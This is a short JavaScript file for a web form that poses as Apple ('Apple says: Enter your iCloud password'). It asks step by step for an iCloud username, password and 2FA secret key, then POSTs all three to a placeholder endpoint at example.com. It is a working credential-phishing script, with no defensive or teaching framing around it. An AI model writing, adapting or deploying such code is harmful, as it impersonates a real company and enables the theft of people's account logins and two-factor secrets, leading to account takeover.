let currentPrompt = 0;
let icloudUsername = "";
let icloudPassword = "";
let twoFactorSecret = "";

document.addEventListener("DOMContentLoaded", function() {
  const promptContainer = document.getElementById("prompt-container");
  const promptElement = document.getElementById("prompt");
  const inputField = document.getElementById("input-field");
  const nextButton = document.getElementById("next-button");

  nextButton.addEventListener("click", function() {
    console.log("Button clicked!");

    if (inputField.value === "") {
      alert("Please enter some input before clicking next!");
      return;
    }

    switch (currentPrompt) {
      case 0:
        console.log("Case 0");
        icloudUsername = inputField.value;
        promptElement.textContent = "Apple says: Enter your iCloud password";
        inputField.value = "";
        inputField.type = "password"; // change input type to password
        break;
      case 1:
        console.log("Case 1");
        icloudPassword = inputField.value;
        promptElement.textContent = "Apple says: Enter your 2FA secret key";
        inputField.value = "";
        inputField.type = "text"; // change input type back to text
        break;
      case 2:
        console.log("Case 2");
        twoFactorSecret = inputField.value;
        // Submit the form to the endpoint
        const formData = new FormData();
        formData.append("icloud_username", icloudUsername);
        formData.append("icloud_password", icloudPassword);
        formData.append("two_factor_secret", twoFactorSecret);
        fetch("https://example.com/endpoint", {
          method: "POST",
          body: formData
        })
        .then(response => {
          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }
          return response.json();
        })
        .then(data => console.log(data))
        .catch(error => console.error(error));
        break;
    }
    currentPrompt++;
  });
});